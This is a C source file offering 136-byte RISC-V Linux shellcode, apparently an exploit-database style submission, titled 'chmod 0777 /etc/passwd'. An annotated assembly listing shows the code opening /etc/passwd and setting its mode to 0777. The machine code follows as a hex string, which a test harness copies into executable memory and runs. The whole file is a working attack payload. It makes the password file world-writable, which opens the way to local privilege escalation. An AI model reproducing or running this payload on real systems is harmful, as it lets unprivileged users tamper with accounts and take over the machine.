/*
 * - arch: RISC-V (RV64I)
 * - env: QEMU
 * - uname: Linux debian 6.12.30-riscv64 #1 SMP Debian 6.12.30-1 (2025-05-28) riscv64 GNU/Linux
 * - title: chmod 0777 /etc/passwd 136 bytes shellcode
 * - author: Paulus Gandung Prakosa <rvn.plvhx@gmail.com>
 *
 * [asm]
 *   slt a7, x0, -1
 *   li a7, 56
 *   slt a0, x0, -1
 *   li a0, -100
 *   slt a1, x0, -1
 *   li a1, 0x74652f2f
 *   sw a1, -16(sp)
 *   li a1, 0x61702f63
 *   sw a1, -12(sp)
 *   li a1, 0x64777373
 *   sw a1, -8(sp)
 *   slt a6, x0, -1
 *   sw a6, -4(sp)
 *   slt a1, x0, -1
 *   addi a1, sp, -16
 *   slt a2, x0, -1
 *   ecall
 *   slt t3, x0, -1
 *   mv t3, a0
 *   slt a7, x0, -1
 *   li a7, 52
 *   slt a0, x0, -1
 *   mv a0, t3
 *   slt a1, x0, -1
 *   addi a1, a1, 0x1ff
 *   ecall
 *   slt a7, x0, -1
 *   li a7, 57
 *   slt a0, x0, -1
 *   mv a0, t3
 *   ecall
 * [/asm]
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

static unsigned char *shellcode = "\x93\x28\xf0\xff\x93\x08\x80\x03\x13\x25\xf0\xff\x13\x05\xc0\xf9"
                                  "\x93\x25\xf0\xff\xb7\x35\x65\x74\x9b\x85\xf5\xf2\x23\x28\xb1\xfe"
                                  "\xb7\x35\x70\x61\x9b\x85\x35\xf6\x23\x2a\xb1\xfe\xb7\x75\x77\x64"
                                  "\x9b\x85\x35\x37\x23\x2c\xb1\xfe\x13\x28\xf0\xff\x23\x2e\x01\xff"
                                  "\x93\x25\xf0\xff\x93\x05\x01\xff\x13\x26\xf0\xff\x73\x00\x00\x00"
                                  "\x13\x2e\xf0\xff\x13\x0e\x05\x00\x93\x28\xf0\xff\x93\x08\x40\x03"
                                  "\x13\x25\xf0\xff\x13\x05\x0e\x00\x93\x25\xf0\xff\x93\x85\xf5\x1f"
                                  "\x73\x00\x00\x00\x93\x28\xf0\xff\x93\x08\x90\x03\x13\x25\xf0\xff"
                                  "\x13\x05\x0e\x00\x73\x00\x00\x00";

int main(void)
{
    void (*pcall)(int, int);

    pcall = mmap(NULL, sysconf(_SC_PAGESIZE),
                 PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (pcall == MAP_FAILED) {
        perror("mmap");
        return -1;
    }

    memcpy(pcall, shellcode, 136);
    pcall(0, 0);

    return 0;
}
